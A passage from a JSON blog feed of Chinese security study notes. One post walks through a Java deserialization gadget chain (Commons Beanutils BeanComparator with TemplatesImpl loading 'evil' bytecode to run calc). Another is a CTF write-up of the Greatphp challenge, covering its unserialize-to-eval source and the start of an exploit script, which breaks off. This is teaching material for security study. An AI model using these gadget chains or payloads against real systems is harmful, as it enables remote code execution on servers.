方法</p>\n<p>那么，我们是否还能找到其他可以利用的 java.util.Comparator 对象呢？</p>\n<h3 id=\"了解apache-commons-beanutils\"><a class=\"anchor\" href=\"#了解apache-commons-beanutils\">#</a> 了解 Apache Commons Beanutils</h3>\n<p>apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 java 类对象（也成为 JavaBean）的一些操作方法。</p>\n<p>关于 JavaNean 的说明可以参考 https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</p>\n<p>比如，Cat 就是一个最简单的 Javabean 类：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">final</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Cat</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"catalina\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>它包含一个私有属性 name，和读取和设置这个属性的两个方法，又称为 getter 和 setter。其中，getter 的方法名以 getr 开头，setter 的方法名以 set 开头，全名符合骆驼式命名法。</p>\n<p>Commons-beanutils 中提供了一个静态方法 PropertUtils.getProperty, 让使用者可以直接调用任意 javaBean 的 getter 方法，比如：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">PropertyUtils</span>。<span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token function\">cat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>此时 Commons-beanutils 会自动找到 name 属性的 getter 方法，也就是 getName，然后调用，获得返回值，除此之外，PropertyUtils。getProperty 还支持递归属性，比如 a 对象中又属性 b，b 对象中有属性 c，我们可以通过 PropertyUtils.getProperty (a,&quot;b.c&quot;); 的方式进行递归获取。通过这个方法，使用者可以很方便的调用任意对象的 getter，使用于在不确定 JavaBean 是哪个类对象是使用。</p>\n<p>commons-beanutils 中注入此类的辅助的方法还有很多，如调用 setter。拷贝属性等</p>\n<h4 id=\"getter的妙用\"><a class=\"anchor\" href=\"#getter的妙用\">#</a> getter 的妙用</h4>\n<p>回到正文，我们需要找可以利用的 java.util.Comparator 对象，在 commons-beanutils 包中就存在一个：</p>\n<p>org.apache.commons.beanutils.BeanComparator.</p>\n<p>BeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了 java.util.Comparator 接口，我们看他的 compare 方法：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">T</span> o1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">T</span> o2 <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> property <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token comment\">// compare the actual objects</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">internalCompare</span><span class=\"token punctuation\">(</span> o1<span class=\"token punctuation\">,</span> o2 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">Object</span> value1 <span class=\"token operator\">=</span> <span class=\"token class-name\">PropertyUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span> o1<span class=\"token punctuation\">,</span> property <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">Object</span> value2 <span class=\"token operator\">=</span> <span class=\"token class-name\">PropertyUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span> o2<span class=\"token punctuation\">,</span> property <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">internalCompare</span><span class=\"token punctuation\">(</span> value1<span class=\"token punctuation\">,</span> value2 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">IllegalAccessException</span> iae <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"IllegalAccessException: \"</span> <span class=\"token operator\">+</span> iae<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">InvocationTargetException</span> ite <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"InvocationTargetException: \"</span> <span class=\"token operator\">+</span> ite<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">NoSuchMethodException</span> nsme <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"NoSuchMethodException: \"</span> <span class=\"token operator\">+</span> nsme<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个方法传入两个都一项，如果 this.property 为空，则直接比较这两个对象；</p>\n<p>如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。</p>\n<p>上一届我们说了，PropertyUtils.getProperty 这个方法会自动调用 JavaBean 的 getter 方法，这个点是任意代码执行的关键。有没有什么 getter 方法可以执行恶心代码呢？</p>\n<p>之前在追踪分析 TemplatesImpl 时，有过这么一段描述：</p>\n<p>调用链是：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getOutputProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">TransletClassLoader</span>#<span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>getOutputProperties 和 newTransformer 方法作用于都是 public，可以被外部调用</p>\n<p>这个 TemplatesImpl#getOutputProperties () 也是调用链上的一环，他的内部调用了 TemplatesImpl#newTransformer ()，也就是我们后面常用来执行恶心字节码的方法：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Properties</span> <span class=\"token function\">getOutputProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOutputProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TransformerConfigurationException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>而 getOutputProperties 这个名字，示意 get 开头，正符合 getter 的定义。</p>\n<p>所以，PropertiesUtils.getProperty（o1,property）, 当 o1 是一个 TemplatesImpl 对象，且 prooperty 的值是 outputProperties 是，将会自动调用 getter，也就是 TemplatesImpl#getOutputProperties () 方法，触发代码执行</p>\n<h3 id=\"反序列化利用链构造\"><a class=\"anchor\" href=\"#反序列化利用链构造\">#</a> 反序列化利用链构造</h3>\n<p>了解了原理，我们就可以构造利用链了，</p>\n<p>首先还是先创建 TemplateImpl：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">ClassPool</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">evil<span class=\"token punctuation\">.</span></span>EvilTemplatesImpl</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>toBytecod</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">e</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HelloTemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>然后，我们实例化本篇讲的 BeanComparator 他的 comparator 方法是我们需要插进去的方法，所以在</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505262049238.png\" alt=\"image-20250526204931008\" /></p>\n<p>这里时他会运行 comparator 的 compare 方法，这不就巧了吗，我直接将我准备好的 comparator 塞到 PriorityQueue 的 comparator，这样就能进入这个 BeanComparetor 的 compare 里面，进而</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505262051592.png\" alt=\"image-20250526205150485\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">PropertyUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span> templatesImpl<span class=\"token punctuation\">,</span> outputProperties<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>就是下方的templatesImpl的getOutputProperties方法</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getOutputProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">TransletClassLoader</span>#<span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后就一溜下去就 calc 了</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505262054740.png\" alt=\"image-20250526205427523\" /></p>\n",
            "tags": [
                "学习笔记",
                "java反序列化"
            ]
        },
        {
            "id": "http://odiws.github.io/2024/07/28/2020-Greatphp/",
            "url": "http://odiws.github.io/2024/07/28/2020-Greatphp/",
            "title": "[极客大挑战2020]Greatphp",
            "date_published": "2024-07-28T14:19:51.000Z",
            "content_html": "<h2 id=\"极客大挑战2020greatphp\"><a class=\"anchor\" href=\"#极客大挑战2020greatphp\">#</a> [极客大挑战 2020] Greatphp</h2>\n<p>源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>               <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Try Hard !!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>           </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这一个条件，在普通的题目里，只需要用数组绕过即可，但是这里是在类中，该怎么绕过呢？</p>\n<p>我们可以使用含有 __toString 方法的 php 内置类来绕过，用的两个比较多的内置类是 Exception 和 Error ，他们之中有一个 __toString fangfa , 当类被当作字符串处理时，就会调用这个函数，以 Error 类为例，我们可控当触发他的__toString 方法时会发生什么？</p>\n<p><img data-src=\"../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/1.png\" alt=\"1\" /></p>\n<p>发现会以字符串的形式 输出当前报错，包含当前的错误信息， 以及他出现错误的行号 (3)，从而传入 Error (&quot;payload&quot;,9) 中的错误代码 “9 ” 则没有被输出出来，再来看看如何 绕过 md5 以及 sha1.</p>\n<p><img data-src=\"../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/2.png\" alt=\"2\" /></p>\n<p>可见 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">a 和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">和</span></span></span></span> b 这两个对象本身是不同的。但是  __toString 方法返回的结果是相同的，这里之所以需要在同一行是因为 __toString 返回的数据包含当前的行号</p>\n<p>Exception 类与 Error 类的使用和结果完全一样，只不过 Exception 类适用于 PHP 5 和 7 而 Error 只适用于 php7</p>\n<p>我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类对象，让着两个对象本身不同 (传入的错误代码即可)， 但是 __toString 方法输出的结果相同即可。</p>\n<p>由于题目 用 preg_match 过滤了小括号 无法调用函数，所以我们尝试 直接 include &quot;/flag&quot; 将 flag 包含进来即可，由于过滤了引号，我们直接用 url 取反绕过即可。</p>\n<p>exp：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>               <span class=\"token keyword\">eval</span><span class=\"token 